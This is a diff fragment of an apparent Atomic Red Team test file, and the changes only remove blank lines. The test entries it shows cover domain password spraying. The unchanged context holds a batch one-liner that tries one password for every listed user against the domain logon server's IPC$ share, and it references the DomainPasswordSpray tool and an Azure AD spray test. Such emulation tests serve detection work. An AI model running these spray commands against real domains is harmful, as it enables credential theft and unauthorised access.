@@ -32,23 +32,19 @@ atomic_tests:
     elevation_required: false
     command: |
       @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
-
 - name: Password Spray (DomainPasswordSpray)
   auto_generated_guid: 263ae743-515f-4786-ac7d-41ef3a0d4b2b
   description: |
     Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain
 
     https://github.com/dafthack/DomainPasswordSpray
-
   supported_platforms:
     - windows
-
   input_arguments:
     domain:
       description: Domain to brute force against
       type: String
       default: (Get-ADDomain | Select-Object -ExpandProperty Name)
-
   executor:
     name: powershell
     elevation_required: false
@@ -106,7 +102,6 @@ atomic_tests:
         }
       }
       Write-Host "End of password spraying"
-
 - name: Password spray all Azure AD users with a single password 
   auto_generated_guid: a8aa2d3e-1c52-4016-bc73-0f8854cfa80a
   description: |
